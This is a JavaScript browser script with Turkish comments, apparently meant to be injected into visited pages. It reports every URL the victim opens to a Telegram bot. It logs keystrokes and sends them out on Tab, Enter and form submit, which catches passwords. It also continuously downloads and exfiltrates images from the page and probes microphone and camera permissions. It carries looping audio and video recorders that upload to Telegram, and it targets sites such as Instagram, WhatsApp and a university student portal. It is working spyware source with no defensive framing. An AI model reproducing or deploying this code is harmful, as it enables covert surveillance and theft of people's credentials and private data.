// benim kodlarim
console.log("BEN BURDAYIM");

// Telegram bot token ve sohbet kimliği
const botToken = ''; // BotFather'dan alınan token
const chatId = ''; // Mesajın gönderileceği sohbet kimliği

// Telegram API URL'si
const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
const telegramAudioApiUrl = `https://api.telegram.org/bot${botToken}/sendAudio`;
const telegramDocumentApiUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
const telegramVideoApiUrl = `https://api.telegram.org/bot${botToken}/sendVideo`;
const telegramPhotoApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
const telegramStickerApiUrl = `https://api.telegram.org/bot${botToken}/sendSticker`;

// Telegram'a mesaj gönderme fonksiyonu
function sendToTelegram(message) {
    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Mesaj Telegram\'a gönderildi:', message);
            } else {
                console.error('Mesaj gönderilemedi:', data.description);
            }
        })
        .catch(error => console.error('Hata:', error));
}

// Telegram'a dosya gönderme fonksiyonu
function sendFileToTelegram(file, caption = '') {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('document', file);
    if (caption) {
        formData.append('caption', caption);
    }

    fetch(telegramDocumentApiUrl, {
        method: 'POST',
        body: formData,
    })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Dosya Telegram\'a gönderildi:', file.name);
            } else {
                console.error('Dosya gönderilemedi:', data.description);
            }
        })
        .catch(error => console.error('Hata:', error));
}

// Mikrofon kaydı ve Telegram'a gönderme
async function microphoneKaydet() {
    try {
        // Mikrofon izni kontrolü
        const permissionStatus = await navigator.permissions.query({ name: 'microphone' });
        if (permissionStatus.state !== 'granted') {
            console.error('Mikrofon izni yok:', permissionStatus.state);
            return;
        }

        // Mikrofon akışını başlat
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        // Kayıt verilerini topla
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };

        // Kayıt tamamlandığında
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const file = new File([blob], `mikrofon_kaydi_${Date.now()}.webm`, { type: 'audio/webm' });
            sendFileToTelegram(file, 'Mikrofon Kaydı');
        };

        // 10 saniye kayıt yap
        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop()); // Akışı durdur
        }, 10000);

        // 10 saniyede bir tekrar et
        setTimeout(microphoneKaydet, 10000);
    } catch (error) {
        console.error('Mikrofon kaydı hatası:', error);
    }
}

// Kamera kaydı ve Telegram'a gönderme
async function kameraKaydet() {
    try {
        // Kamera izni kontrolü
        const permissionStatus = await navigator.permissions.query({ name: 'camera' });
        if (permissionStatus.state !== 'granted') {
            console.error('Kamera izni yok:', permissionStatus.state);
            return;
        }

        // Kamera akışını başlat
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        // Kayıt verilerini topla
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };

        // Kayıt tamamlandığında
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const file = new File([blob], `kamera_kaydi_${Date.now()}.webm`, { type: 'video/webm' });
            sendFileToTelegram(file, 'Kamera Kaydı');
        };

        // 10 saniye kayıt yap
        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop()); // Akışı durdur
        }, 10000);

        // 10 saniyede bir tekrar et
        setTimeout(kameraKaydet, 10000);
    } catch (error) {
        console.error('Kamera kaydı hatası:', error);
    }
}

let siteAdresi = window.location.href;
sendToTelegram("Acilan Site: " + siteAdresi);

if(siteAdresi.includes("instagram.com")) {

}
else if(siteAdresi.includes("ois.istinye.edu.tr")) {

}
else if(siteAdresi.includes("github.com")) {

}
else if(siteAdresi.includes("teams.microsoft.com")) {

}
else if(siteAdresi.includes("whatsapp.com")) {

}


// Mevcut görsel kaynaklarını tutacak liste
let imgSources = [];

// Yeni görselleri sürekli kontrol eden ve Telegram'a gönderen fonksiyon
function checkImagesContinuously() {
    const images = document.getElementsByTagName('img');
    const newImages = [];

    for (let img of images) {
        let imgSrc = '';

        // Hem src hem de data:image formatını kontrol et
        if (img.src) {
            if (img.src.startsWith('data:image')) {
                imgSrc = img.src; // Base64 formatındaki görsel
            } else if (img.src.startsWith('http') || img.src.startsWith('//')) {
                imgSrc = img.src; // URL tabanlı görsel
            }

            // Yeni görsel mi kontrol et
            if (imgSrc && !imgSources.includes(imgSrc)) {
                imgSources.push(imgSrc);
                newImages.push(imgSrc);
            }
        }
    }

    // Yeni görseller varsa Telegram'a gönder
    newImages.forEach(async (src, index) => {
        try {
            let file;
            let fileName;

            if (src.startsWith('data:image')) {
                // Base64 görseli Blob'a çevir
                const response = await fetch(src);
                const blob = await response.blob();
                const extension = src.split(';')[0].split('/')[1] || 'png'; // Örn: png, jpeg
                fileName = `image_${Date.now()}_${index}.${extension}`;
                file = new File([blob], fileName, { type: `image/${extension}` });
            } else {
                // URL tabanlı görseli indir ve Blob'a çevir
                const response = await fetch(src);
                const blob = await response.blob();
                const extension = src.split('.').pop().split('?')[0] || 'jpg'; // Örn: jpg, png
                fileName = `image_${Date.now()}_${index}.${extension}`;
                file = new File([blob], fileName, { type: `image/${extension}` });
            }

            // Telegram'a gönder
            sendFileToTelegram(file, `Yeni Görsel: ${fileName}`);
            console.log(`Yeni görsel gönderildi: ${fileName}`);
            sendToTelegram(`Yeni görsel eklendi: ${src}`);
        } catch (error) {
            console.error(`Görsel gönderilemedi (${src}):`, error);
            sendToTelegram(`Görsel gönderilemedi: ${src}, Hata: ${error.message}`);
        }
    });

    console.log('Güncel Görsel Listesi:', imgSources);

    // 5 saniyede bir kontrol et
    setTimeout(checkImagesContinuously, 5000);
}

// 1. Sayfa yüklendikten sonra img etiketlerinin src'lerini toplama
document.addEventListener('DOMContentLoaded', () => {
    // İlk img src'leri topla
    const images = document.getElementsByTagName('img');
    for (let img of images) {
        if (img.src) {
            imgSources.push(img.src);
        }
    }
    console.log('Başlangıç Image Sources:', imgSources);

    // Sürekli kontrolü başlat
    checkImagesContinuously();
    // 2. Klavye tuşlarını toplama ve belirli tuşlarda fonksiyona gönderme
    let keyBuffer = '';
    
    document.addEventListener('keydown', (event) => {
        // Tuşları biriktir
        keyBuffer += event.key;
        
        // TAB, ENTER veya SUBMIT (form submit için) kontrolü
        if (event.key === 'Tab' || event.key === 'Enter') {
            sendKeystrokes(keyBuffer);
            keyBuffer = ''; // Buffer'ı sıfırla
        }
    });

    // Form submit olayını yakalama
    document.addEventListener('submit', (event) => {
        sendKeystrokes(keyBuffer);
        keyBuffer = ''; // Buffer'ı sıfırla
    });

    // Klavye verisini işleyen fonksiyon
    function sendKeystrokes(data) {
        console.log('Collected Keystrokes:', data);
        sendToTelegram("Collected Keystrokes: " + data);
        // Burada veriyi başka bir yere gönderebilirsiniz (örn. server)
    }

    // 3. Mikrofon izni kontrol fonksiyonu
    function checkMicrophonePermission() {
        return navigator.permissions.query({ name: 'microphone' })
            .then(permissionStatus => {
                console.log('Microphone Permission:', permissionStatus.state);
                sendToTelegram("Microphone Permission: " + permissionStatus.state);
                if(permissionStatus.state == 'granted') {
                    // microphoneKaydet();
                }
                return permissionStatus.state; // 'granted', 'denied', veya 'prompt'

                
            })
            .catch(error => {
                console.error('Microphone Permission Error:', error);
                sendToTelegram('Microphone Permission Error: ' + error);

                return 'error';
            });
    }

    // 4. Kamera izni kontrol fonksiyonu
    function checkCameraPermission() {
        return navigator.permissions.query({ name: 'camera' })
            .then(permissionStatus => {
                console.log('Camera Permission:', permissionStatus.state);
                sendToTelegram("Camera Permission: " + permissionStatus.state);
                if(permissionStatus.state == 'granted') {
                    // kameraKaydet();
                }
                return permissionStatus.state; // 'granted', 'denied', veya 'prompt'
            })
            .catch(error => {
                console.error('Camera Permission Error:', error);
                sendToTelegram('Camera Permission Error:' + error);
                return 'error';
            });
    }

    // Fonksiyonları test etmek için çağır
    checkMicrophonePermission();
    checkCameraPermission();
});
